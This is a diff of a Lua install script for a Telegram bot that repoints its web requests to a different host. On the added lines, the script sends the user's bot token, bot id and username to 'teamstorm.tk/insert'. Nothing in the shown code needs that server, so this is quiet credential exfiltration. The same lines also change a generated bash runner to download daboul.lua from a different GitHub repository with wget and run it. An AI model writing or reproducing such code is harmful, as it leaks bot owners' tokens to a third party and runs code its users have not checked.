@@ -38,7 +38,7 @@ if not database:get(Server_daboul.."UserName_daboul") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://daboul.ml/info/?user="..UserName)
+local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,14 +64,14 @@ os.execute('lua start.lua')
 end
 local function Files_daboul_Info()
 Create_Info(database:get(Server_daboul.."Token_daboul"),database:get(Server_daboul.."Id_daboul"),database:get(Server_daboul.."UserName_daboul"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_daboul.."Id_daboul").."&user="..database:get(Server_daboul.."UserName_daboul").."&token="..database:get(Server_daboul.."Token_daboul"))
+http.request("http://teamstorm.tk/insert/?id="..database:get(Server_daboul.."Id_daboul").."&user="..database:get(Server_daboul.."UserName_daboul").."&token="..database:get(Server_daboul.."Token_daboul"))
 local Rundaboul = io.open("daboul", 'w')
 Rundaboul:write([[
 #!/usr/bin/env bash
 cd $HOME/daboul
 token="]]..database:get(Server_daboul.."Token_daboul")..[["
-rm -fr daboul.lua
-wget "https://raw.githubusercontent.com/daboulBot/daboul/master/daboul.lua"
+rm -fr TRND.lua
+wget "https://raw.githubusercontent.com/aksiil/daboul/master/daboul.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./daboul.lua -p PROFILE --bot=$token
